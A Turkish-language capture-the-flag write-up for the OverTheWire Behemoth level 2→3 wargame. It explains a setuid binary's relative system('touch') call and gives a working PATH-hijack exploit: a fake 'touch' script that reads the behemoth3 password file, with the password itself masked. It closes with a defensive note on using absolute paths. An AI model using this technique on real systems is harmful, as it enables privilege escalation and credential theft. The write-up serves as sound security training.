# OverTheWire — Behemoth Level 2 → 3

> Hedef: `behemoth2`'den `behemoth3` şifresi. Sonuç: **`**********`** (gizlendi)
> Teknik: **PATH hijack** — `system("touch %d")` göreli komut adı → sahte `touch`.

---

## 1. Bağlantı
```bash
ssh behemoth2@behemoth.labs.overthewire.org -p 2221
```

## 2. Zafiyet — disasm + rodata
```c
pid = getpid();
sprintf(buf, "touch %d", pid);      // fmt @0x804a008 = "touch %d"
lstat(buf+6, &st);                  // lstat("<pid>")
... 
setreuid(geteuid(), geteuid());     // euid = behemoth3
system(buf);                        // system("touch <pid>")   <<< PATH hijack!
sleep(2000);
```
`system("touch <pid>")` → `/bin/sh -c "touch <pid>"` → `touch` **PATH'ten** bulunur. Program
`setreuid(behemoth3)` yaptığı için `system` **behemoth3 yetkisiyle** çalışır.

## 3. Exploit
PATH'in başına, kötücül bir `touch` içeren dizin koy:
```bash
W=$(mktemp -d); chmod 755 "$W"; cd "$W"
printf '#!/bin/sh\ncat /etc/behemoth_pass/behemoth3\n' > touch
chmod 755 touch
PATH="$W:$PATH" timeout 3 /behemoth/behemoth2      # sahte touch behemoth3 olarak çalışır -> şifre
```
> `touch` script'i behemoth3 olarak çalışıp şifreyi basar. (Program sonra `sleep(2000)`'e
> girer; `timeout 3` ile kesilir — şifre `system` sırasında, sleep'ten ÖNCE basılır.)


## Dersler
| Konu | Not |
|------|-----|
| PATH hijack | `system`/`execlp` göreli komut adı (`touch`) → PATH kontrolü sende |
| setreuid + system | komut, suid programın euid'iyle (behemoth3) çalışır |
| mutlak yol kullan (savunma) | `system("/bin/touch ...")` olsaydı hijack olmazdı |

